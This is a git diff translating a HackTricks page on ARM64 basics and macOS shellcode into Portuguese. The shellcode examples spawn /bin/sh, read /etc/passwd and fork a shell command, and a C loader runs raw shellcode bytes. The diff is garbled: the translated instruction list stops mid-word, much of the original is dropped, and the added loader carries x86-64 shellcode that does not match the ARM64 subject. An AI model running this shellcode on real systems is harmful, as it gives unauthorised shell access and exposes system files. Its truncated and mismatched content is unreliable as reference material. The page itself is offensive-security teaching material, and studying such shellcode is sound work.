@@ -1,106 +1,50 @@
-# Introduction to ARM64
+# Introdução ao ARM64
 
-<details>
+ARM64, também conhecido como ARMv8-A, é uma arquitetura de processador de 64 bits usada em vários tipos de dispositivos, incluindo smartphones, tablets, servidores e até mesmo alguns computadores pessoais de alta qualidade (macOS). É um produto da ARM Holdings, uma empresa conhecida por seus designs de processadores energeticamente eficientes.
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+### Registradores
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+O ARM64 tem **31 registradores de propósito geral**, rotulados de `x0` a `x30`. Cada um pode armazenar um valor de **64 bits** (8 bytes). Para operações que requerem apenas valores de 32 bits, os mesmos registradores podem ser acessados em um modo de 32 bits usando os nomes w0 a w30.
 
-</details>
+1. **`x0`** a **`x7`** - Esses são normalmente usados como registradores temporários e para passar parâmetros para sub-rotinas.
+   * **`x0`** também carrega os dados de retorno de uma função.
+2. **`x8`** - No kernel do Linux, `x8` é usado como o número de chamada do sistema para a instrução `svc`. **No macOS, o x16 é o usado!**
+3. **`x9`** a **`x15`** - Mais registradores temporários, frequentemente usados para variáveis locais.
+4. **`x16`** e **`x17`** - Registradores temporários, também usados para chamadas de função indiretas e stubs PLT (Procedure Linkage Table).
+   * **`x16`** é usado como o número de chamada do sistema para a instrução **`svc`**.
+5. **`x18`** - Registrador de plataforma. Em algumas plataformas, este registrador é reservado para usos específicos da plataforma.
+6. **`x19`** a **`x28`** - Estes são registradores preservados pelo chamado. Uma função deve preservar os valores desses registradores para seu chamador.
+7. **`x29`** - **Ponteiro de quadro**.
+8. **`x30`** - Registrador de link. Ele contém o endereço de retorno quando uma instrução `BL` (Branch with Link) ou `BLR` (Branch with Link to Register) é executada.
+9. **`sp`** - **Ponteiro de pilha**, usado para acompanhar o topo da pilha.
+10. **`pc`** - **Contador de programa**, que aponta para a próxima instrução a ser executada.
 
-## **Introduction to ARM64**
+### Convenção de Chamada
 
-ARM64, also known as ARMv8-A, is a 64-bit processor architecture used in various types of devices including smartphones, tablets, servers, and even some high-end personal computers (macOS). It's a product of ARM Holdings, a company known for its energy-efficient processor designs.
+A convenção de chamada ARM64 especifica que os **primeiros oito parâmetros** de uma função são passados nos registradores **`x0` a `x7`**. **Parâmetros adicionais** são passados na **pilha**. O **valor de retorno** é passado de volta no registrador **`x0`**, ou em **`x1`** também **se for de 128 bits**. Os registradores **`x19`** a **`x30`** e **`sp`** devem ser **preservados** em chamadas de função.
 
-### **Registers**
+Ao ler uma função em assembly, procure o **prólogo e epílogo da função**. O **prólogo** geralmente envolve **salvar o ponteiro de quadro (`x29`)**, **configurar** um **novo ponteiro de quadro** e **alocar espaço na pilha**. O **epílogo** geralmente envolve **restaurar o ponteiro de quadro salvo** e **retornar** da função.
 
-ARM64 has **31 general-purpose registers**, labeled `x0` through `x30`. Each can store a **64-bit** (8-byte) value. For operations that require only 32-bit values, the same registers can be accessed in a 32-bit mode using the names w0 through w30.
+### Instruções Comuns
 
-1. **`x0`** to **`x7`** - These are typically used as scratch registers and for passing parameters to subroutines.
-   * **`x0`** also carries the return data of a function
-2. **`x8`** - In the Linux kernel, `x8` is used as the system call number for the `svc` instruction. **In macOS the x16 is the one used!**
-3. **`x9`** to **`x15`** - More temporary registers, often used for local variables.
-4. **`x16`** and **`x17`** - Temporary registers, also used for indirect function calls and PLT (Procedure Linkage Table) stubs.
-   * **`x16`** is used as the **system call number** for the **`svc`** instruction.
-5. **`x18`** - Platform register. On some platforms, this register is reserved for platform-specific uses.
-6. **`x19`** to **`x28`** - These are callee-saved registers. A function must preserve these registers' values for its caller.
-7. **`x29`** - **Frame pointer**.
-8. **`x30`** - Link register. It holds the return address when a `BL` (Branch with Link) or `BLR` (Branch with Link to Register) instruction is executed.
-9. **`sp`** - **Stack pointer**, used to keep track of the top of the stack.
-10. **`pc`** - **Program counter**, which points to the next instruction to be executed.
+As instruções ARM64 geralmente têm o **formato `opcode dst, src1, src2`**, onde **`opcode`** é a **operação** a ser executada (como `add`, `sub`, `mov`, etc.), **`dst`** é o **registrador de destino** onde o resultado será armazenado e **`src1`** e **`src2`** são os **registradores de origem**. Valores imediatos também podem ser usados ​​no lugar de registradores de origem.
 
-### **Calling Convention**
-
-The ARM64 calling convention specifies that the **first eight parameters** to a function are passed in registers **`x0` through `x7`**. **Additional** parameters are passed on the **stack**. The **return** value is passed back in register **`x0`**, or in **`x1`** as well **if it's 128 bits**. The **`x19`** to **`x30`** and **`sp`** registers must be **preserved** across function calls.
-
-When reading a function in assembly, look for the **function prologue and epilogue**. The **prologue** usually involves **saving the frame pointer (`x29`)**, **setting** up a **new frame pointer**, and a**llocating stack space**. The **epilogue** usually involves **restoring the saved frame pointer** and **returning** from the function.
-
-### **Common Instructions**
-
-ARM64 instructions generally have the **format `opcode dst, src1, src2`**, where **`opcode`** is the **operation** to be performed (such as `add`, `sub`, `mov`, etc.), **`dst`** is the **destination** register where the result will be stored, and **`src1`** and **`src2`** are the **source** registers. Immediate values can also be used in place of source registers.
-
-* **`mov`**: **Move** a value from one **register** to another.
-  * Example: `mov x0, x1` — This moves the value from `x1` to `x0`.
-* **`ldr`**: **Load** a value from **memory** into a **register**.
-  * Example: `ldr x0, [x1]` — This loads a value from the memory location pointed to by `x1` into `x0`.
-* **`str`**: **Store** a value from a **register** into **memory**.
-  * Example: `str x0, [x1]` — This stores the value in `x0` into the memory location pointed to by `x1`.
-* **`ldp`**: **Load Pair of Registers**. This instruction **loads two registers** from **consecutive memory** locations. The memory address is typically formed by adding an offset to the value in another register.
-  * Example: `ldp x0, x1, [x2]` — This loads `x0` and `x1` from the memory locations at `x2` and `x2 + 8`, respectively.
-* **`stp`**: **Store Pair of Registers**. This instruction **stores two registers** to **consecutive memory** locations. The memory address is typically formed by adding an offset to the value in another register.
-  * Example: `stp x0, x1, [x2]` — This stores `x0` and `x1` to the memory locations at `x2` and `x2 + 8`, respectively.
-* **`add`**: **Add** the values of two registers and store the result in a register.
-  * Example: `add x0, x1, x2` — This adds the values in `x1` and `x2` together and stores the result in `x0`.
-* **`sub`**: **Subtract** the values of two registers and store the result in a register.
-  * Example: `sub x0, x1, x2` — This subtracts the value in `x2` from `x1` and stores the result in `x0`.
-* **`mul`**: **Multiply** the values of **two registers** and store the result in a register.
-  * Example: `mul x0, x1, x2` — This multiplies the values in `x1` and `x2` and stores the result in `x0`.
-* **`div`**: **Divide** the value of one register by another and store the result in a register.
-  * Example: `div x0, x1, x2` — This divides the value in `x1` by `x2` and stores the result in `x0`.
-* **`bl`**: **Branch** with link, used to **call** a **subroutine**. Stores the **return address in `x30`**.
-  * Example: `bl myFunction` — This calls the function `myFunction` and stores the return address in `x30`.
-* **`blr`**: **Branch** with Link to Register, used to **call** a **subroutine** where the target is **specified** in a **register**. Stores the return address in `x30`.
-  * Example: `blr x1` — This calls the function whose address is contained in `x1` and stores the return address in `x30`.
-* **`ret`**: **Return** from **subroutine**, typically using the address in **`x30`**.
-  * Example: `ret` — This returns from the current subroutine using the return address in `x30`.
-* **`cmp`**: **Compare** two registers and set condition flags.
-  * Example: `cmp x0, x1` — This compares the values in `x0` and `x1` and sets the condition flags accordingly.
-* **`b.eq`**: **Branch if equal**, based on the previous `cmp` instruction.
-  * Example: `b.eq label` — If the previous `cmp` instruction found two equal values, this jumps to `label`.
-* **`b.ne`**: **Branch if Not Equal**. This instruction checks the condition flags (which were set by a previous comparison instruction), and if the compared values were not equal, it branches to a label or address.
-  * Example: After a `cmp x0, x1` instruction, `b.ne label` — If the values in `x0` and `x1` were not equal, this jumps to `label`.
-* **`cbz`**: **Compare and Branch on Zero**. This instruction compares a register with zero, and if they are equal, it branches to a label or address.
-  * Example: `cbz x0, label` — If the value in `x0` is zero, this jumps to `label`.
-* **`cbnz`**: **Compare and Branch on Non-Zero**. This instruction compares a register with zero, and if they are not equal, it branches to a label or address.
-  * Example: `cbnz x0, label` — If the value in `x0` is non-zero, this jumps to `label`.
-* **`adrp`**: Compute the **page address of a symbol** and store it in a register.
-  * Example: `adrp x0, symbol` — This computes the page address of `symbol` and stores it in `x0`.
-* **`ldrsw`**: **Load** a signed **32-bit** value from memory and **sign-extend it to 64** bits.
-  * Example: `ldrsw x0, [x1]` — This loads a signed 32-bit value from the memory location pointed to by `x1`, sign-extends it to 64 bits, and stores it in `x0`.
-* **`stur`**: **Store a register value to a memory location**, using an offset from another register.
-  * Example: `stur x0, [x1, #4]` — This stores the value in `x0` into the memory ddress that is 4 bytes greater than the address currently in `x1`.
-* &#x20;**`svc`** : Make a **system call**. It stands for "Supervisor Call". When the processor executes this instruction, it **switches from user mode to kernel mode** and jumps to a specific location in memory where the **kernel's system call handling** code is located.
-  *   Example:&#x20;
-
-      ```armasm
-      mov x8, 93  ; Load the system call number for exit (93) into register x8.
-      mov x0, 0   ; Load the exit status code (0) into register x0.
-      svc 0       ; Make the system call.
-      ```
-
+* **`mov`**: **Mover** um valor de um **registrador** para outro.
+  * Exemplo: `mov x0, x1` - Isso move o valor de `x1` para `x0`.
+* **`ldr`**: **Carregar** um valor da **memória** em um **registrador**.
+  * Exemplo: `ldr x0, [x1]` - Isso carrega um valor da localização de memória apontada por `x1` em `x0`.
+* **`str`**: **Armazenar** um valor de um **registrador** na **memória**.
+  * Exemplo: `str x0, [x1]` - Isso armazena o valor em `x0` na localização de memória apontada por `x1`.
+* **`ldp`**: **Carregar Par de Registradores**. Esta instrução **carrega dois registr
 ## macOS
 
 ### syscalls
 
-Check out [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master).
+Confira [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master).
 
 ### Shellcodes
 
-To compile:
+Para compilar:
 
 {% code overflow="wrap" %}
 ```bash
@@ -109,19 +53,30 @@ ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/Comm
 ```
 {% endcode %}
 
-To extract the bytes:
-
+Para extrair os bytes:
 ```bash
 # Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
 for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
     echo -n '\\x'$c
 done
 ```
+<detalhes>
 
-<details>
+<sumário>Código C para testar o shellcode</sumário>
 
-<summary>C code to test the shellcode</summary>
+```c
+#include<stdio.h>
+#include<string.h>
 
+unsigned char code[] = \
+"\x48\x31\xc0\x48\x83\xc0\x3b\x48\x83\xc7\x01\x48\x8d\x34\x24\x48\x89\xc6\x48\x8d\x77\x08\x48\x8d\x7f\x08\x48\x8d\x57\x10\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05";
+
+int main(){
+    printf("Shellcode Length: %d\n", (int)strlen(code));
+    int (*ret)() = (int(*)())code;
+    ret();
+}
+```
 ```c
 // code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
 // gcc loader.c -o loader
@@ -167,15 +122,14 @@ int main(int argc, char **argv) {
     return 0;
 }
 ```
-
 </details>
 
 #### Shell
 
-Taken from [**here**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) and explained.
+Retirado [**aqui**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) e explicado.
 
 {% tabs %}
-{% tab title="with adr" %}
+{% tab title="com adr" %}
 ```armasm
 .section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
 .global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
@@ -192,7 +146,7 @@ sh_path: .asciz "/bin/sh"
 ```
 {% endtab %}
 
-{% tab title="with stack" %}
+{% tab title="com pilha" %}
 ```armasm
 .section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
 .global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
@@ -224,10 +178,9 @@ _main:
 {% endtab %}
 {% endtabs %}
 
-#### Read with cat
+#### Ler com cat
 
-The goal is to execute `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, so the second argument (x1) is an array of params (which in memory these means a stack of the addresses).
-
+O objetivo é executar `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, então o segundo argumento (x1) é um array de parâmetros (que na memória significa uma pilha de endereços).
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -253,9 +206,7 @@ cat_path: .asciz "/bin/cat"
 .align 2
 passwd_path: .asciz "/etc/passwd"
 ```
-
-#### Invoke command with sh from a fork so the main process is not killed
-
+#### Invocar comando com sh a partir de um fork para que o processo principal não seja encerrado
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -299,15 +250,14 @@ sh_c_option: .asciz "-c"
 .align 2
 touch_command: .asciz "touch /tmp/lalala"
 ```
-
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) **grupo do Discord** ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live).
+* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
